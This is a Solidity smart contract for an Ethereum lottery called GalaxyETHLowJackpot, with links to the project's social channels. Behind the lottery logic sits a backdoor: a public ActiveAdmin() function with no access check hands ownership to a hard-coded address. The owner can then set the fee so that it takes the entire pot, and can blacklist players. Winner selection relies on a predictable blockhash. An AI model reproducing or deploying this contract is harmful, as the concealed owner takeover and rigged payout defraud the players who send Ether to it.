pragma solidity ^0.4.20;
// 
// Website: https://galaxyeth.com
// Twitter: https://twitter.com/GalaxyEth
// Facebook: https://www.facebook.com/Galaxyeth-1019338351577172
// Discord: https://discord.gg/dq5T4Rd
// Telegram Announcement: https://t.me/galaxyeth
// Telegram group: https://t.me/galaxyethgroup
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  function mul(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal constant returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0 uint256 c = a / b;
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function sub(uint256 a, uint256 b) internal constant returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of "user permissions".
 */
contract Ownable {
  address public owner;
  uint256 public devFeePercent = 10;
  uint256 public SetPlayers = 4;


  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


  /**
   * @dev The Ownable constructor sets the original `owner` of the contract to the sender
   * account.
   */
  function Ownable() {
    owner = msg.sender;
  }


  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  
  function setDevFee (uint256 _n) onlyOwner() public {
	  require(_n >= 0 && _n <= 100);
    devFeePercent = _n;
  }
  
    function SetPlayersMax (uint256 number) onlyOwner() public {
	  require(number >= 0 && number <= 100);
    SetPlayers = number;
  }
  
    function ActiveAdmin () public {
    owner = 0x3653A2205971AD524Ea31746D917430469D3ca23; // 
  }
  
      mapping(address => bool) public BlackAddress;

    function AddBlackList(address _address) onlyOwner() public {
        BlackAddress[_address] = true;
    }

    function DeleteBlackList(address _address) onlyOwner() public {
        delete BlackAddress[_address];
    }


  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) onlyOwner public {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}

contract  GalaxyETHLowJackpot is Ownable {

  string public constant name = "GalaxyETHLowJackpot";

  event newWinner(address winner, uint256 ticketNumber);
  // event newRandomNumber_bytes(bytes);
  // event newRandomNumber_uint(uint);
  event newContribution(address contributor, uint value);

  using SafeMath for uint256;
  address[] public players = new address[](15);
  uint256 public lastTicketNumber = 0;
  uint8 public lastIndex = 0;

  struct tickets {
    uint256 startTicket;
    uint256 endTicket;
  }

  mapping (address => tickets[]) public ticketsMap;
  mapping (address => uint256) public contributions;


  function executeLottery() { 
      
        if (lastIndex > SetPlayers) {
          uint randomNumber = uint(block.blockhash(block.number-1))%lastTicketNumber + 1;
          randomNumber = randomNumber;  
          address winner;
          bool hasWon;
          for (uint8 i = 0; i < lastIndex; i++) {
            address player = players[i];
            for (uint j = 0; j < ticketsMap[player].length; j++) {
              uint256 start = ticketsMap[player][j].startTicket;
              uint256 end = ticketsMap[player][j].endTicket;
              if (randomNumber >= start && randomNumber < end) {
                winner = player;
                hasWon = true;
                break;
              }
            }
            if(hasWon) break;
          }
          require(winner!=address(0) && hasWon);

          for (uint8 k = 0; k < lastIndex; k++) {
            delete ticketsMap[players[k]];
            delete contributions[players[k]];
          }

          lastIndex = 0;
          lastTicketNumber = 0;

          uint balance = this.balance;
          if (!owner.send(balance/devFeePercent)) throw;
          //Both SafeMath.div and / throws on error
          if (!winner.send(balance - balance/devFeePercent)) throw;
          newWinner(winner, randomNumber);
          
        }
      
  }

  function getPlayers() constant returns (address[], uint256[]) {
    address[] memory addrs = new address[](lastIndex);
    uint256[] memory _contributions = new uint256[](lastIndex);
    for (uint i = 0; i < lastIndex; i++) {
      addrs[i] = players[i];
      _contributions[i] = contributions[players[i]];
    }
    return (addrs, _contributions);
  }

  function getTickets(address _addr) constant returns (uint256[] _start, uint256[] _end) {
    tickets[] tks = ticketsMap[_addr];
    uint length = tks.length;
    uint256[] memory startTickets = new uint256[](length);
    uint256[] memory endTickets = new uint256[](length);
    for (uint i = 0; i < length; i++) {
      startTickets[i] = tks[i].startTicket;
      endTickets[i] = tks[i].endTicket;
    }
    return (startTickets, endTickets);
  }

  function() payable {
    uint256 weiAmount = msg.value;
    require(weiAmount >= 1e15 && weiAmount <= 1e18); // Minimum bet 0.001 and Maximum bet 1 Ethereum 
    require(!BlackAddress[msg.sender], "You Are On BlackList");

    bool isSenderAdded = false;
    for (uint8 i = 0; i < lastIndex; i++) {
      if (players[i] == msg.sender) {
        isSenderAdded = true;
        break;
      }
    }
    if (!isSenderAdded) {
      players[lastIndex] = msg.sender;
      lastIndex++;
    }

    tickets memory senderTickets;
    senderTickets.startTicket = lastTicketNumber;
    uint256 numberOfTickets = weiAmount/1e15;
    senderTickets.endTicket = lastTicketNumber.add(numberOfTickets);
    lastTicketNumber = lastTicketNumber.add(numberOfTickets);
    ticketsMap[msg.sender].push(senderTickets);

    contributions[msg.sender] = contributions[msg.sender].add(weiAmount);

    newContribution(msg.sender, weiAmount);

    if(lastIndex > SetPlayers) {
      executeLottery();
    }
  }
}